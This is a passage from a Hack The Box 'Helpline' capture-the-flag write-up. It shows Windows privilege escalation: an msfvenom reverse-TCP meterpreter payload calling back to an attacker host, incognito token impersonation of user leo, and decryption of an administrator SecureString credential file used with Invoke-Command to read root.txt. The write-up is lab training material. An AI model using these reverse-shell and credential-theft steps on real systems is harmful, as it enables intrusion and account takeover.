<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\leo\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is D258-5C3B</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\leo\Desktop</span><br><span class="line"></span><br><span class="line">01&#x2F;15&#x2F;2019  01:21 AM    &lt;DIR&gt;          .</span><br><span class="line">01&#x2F;15&#x2F;2019  01:21 AM    &lt;DIR&gt;          ..</span><br><span class="line">01&#x2F;15&#x2F;2019  01:18 AM               526 admin-pass.xml</span><br><span class="line">               1 File(s)            526 bytes</span><br><span class="line">               2 Dir(s)   5,850,574,848 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\leo\Desktop&gt;type admin-pass.xml</span><br><span class="line">type admin-pass.xml</span><br><span class="line">Access is denied.</span><br></pre></td></tr></table></figure>
<p>Only <code>leo</code> can read it. <code>leo&#39;s</code> hash was uncrackable so I looked for other ways to be <code>leo</code>. I wanted to see if I can impersonate <code>leo</code>‘s token so I created a <code>metasploit</code> payload and got a <code>meterpreter</code> session.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.10.xx.xx LPORT&#x3D;1441 -f exe &gt; m.exe</span><br></pre></td></tr></table></figure>
<p>And yes, I could impersonate <code>leo</code>‘s token :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load incognito </span><br><span class="line">Loading extension incognito...Success.</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Font Driver Host\UMFD-0</span><br><span class="line">Font Driver Host\UMFD-1</span><br><span class="line">HELPLINE\leo</span><br><span class="line">HELPLINE\tolu</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">Window Manager\DWM-1</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">No tokens available</span><br><span class="line"></span><br><span class="line">meterpreter &gt; impersonate_token &#39;HELPLINE\leo&#39;</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user HELPLINE\leo</span><br><span class="line">meterpreter &gt; shell -t </span><br><span class="line">Process 5344 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.17763.253]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\System32\spool\drivers\color&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">helpline\leo</span><br><span class="line"></span><br><span class="line">C:\Windows\System32\spool\drivers\color&gt;</span><br></pre></td></tr></table></figure>
<p>Now we can read <code>admin-pass.xml</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\spool\drivers\color&gt;cd c:\users\leo\desktop</span><br><span class="line">cd c:\users\leo\desktop</span><br><span class="line"></span><br><span class="line">c:\Users\leo\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is D258-5C3B</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\leo\Desktop</span><br><span class="line"></span><br><span class="line">01&#x2F;15&#x2F;2019  01:21 AM    &lt;DIR&gt;          .</span><br><span class="line">01&#x2F;15&#x2F;2019  01:21 AM    &lt;DIR&gt;          ..</span><br><span class="line">01&#x2F;15&#x2F;2019  01:18 AM               526 admin-pass.xml</span><br><span class="line">               1 File(s)            526 bytes</span><br><span class="line">               2 Dir(s)   5,719,506,944 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users\leo\Desktop&gt;type admin-pass.xml</span><br><span class="line">type admin-pass.xml</span><br><span class="line">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaa</span><br><span class="line"></span><br><span class="line">c:\Users\leo\Desktop&gt;</span><br></pre></td></tr></table></figure>
<p>I used <code>Invoke-Command</code> again and used <code>Get-Content</code> to read <code>admin-pass.xml</code> instead of putting the password in a variable.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c:\Users\leo\Desktop&gt;powershell</span><br><span class="line">powershell</span><br><span class="line">Windows PowerShell </span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\Users\leo\Desktop&gt; <span class="variable">$username</span> = <span class="string">"Helpline\Administrator"</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">"Helpline\Administrator"</span></span><br><span class="line">PS C:\Users\leo\Desktop&gt; <span class="variable">$password</span> = <span class="string">"admin-pass.xml"</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">"admin-pass.xml"</span></span><br><span class="line">PS C:\Users\leo\Desktop&gt; <span class="variable">$credential</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Management.Automation.PSCredential <span class="literal">-ArgumentList</span> <span class="variable">$username</span>, (<span class="built_in">Get-Content</span> <span class="variable">$password</span> | <span class="built_in">ConvertTo-SecureString</span>)</span><br><span class="line"><span class="variable">$credential</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Management.Automation.PSCredential <span class="literal">-ArgumentList</span> <span class="variable">$username</span>, (<span class="built_in">Get-Content</span> <span class="variable">$password</span> | <span class="built_in">ConvertTo-SecureString</span>)</span><br><span class="line">PS C:\Users\leo\Desktop&gt; <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> HELPLINE <span class="literal">-Credential</span> <span class="variable">$credential</span> <span class="literal">-Authentication</span> credssp <span class="literal">-ScriptBlock</span> &#123;type C:\Users\Administrator\Desktop\root.txt&#125;</span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> HELPLINE <span class="literal">-Credential</span> <span class="variable">$credential</span> <span class="literal">-Authentication</span> credssp <span class="literal">-ScriptBlock</span> &#123;type C:\Users\Administrator\Desktop\root.txt&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/helpline/28.png" alt=""><br>We owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/arkham/">Hack The Box - Arkham</a><br>Next Hack The Box write-up : <a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-08-17</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/cryptography/" rel="tag">#cryptography</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a> <a class="tag-link" href="/tags/windows/" rel="tag">#windows</a> <a class="tag-link" href="/tags/windows-exploitation/" rel="tag">#windows-exploitation</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
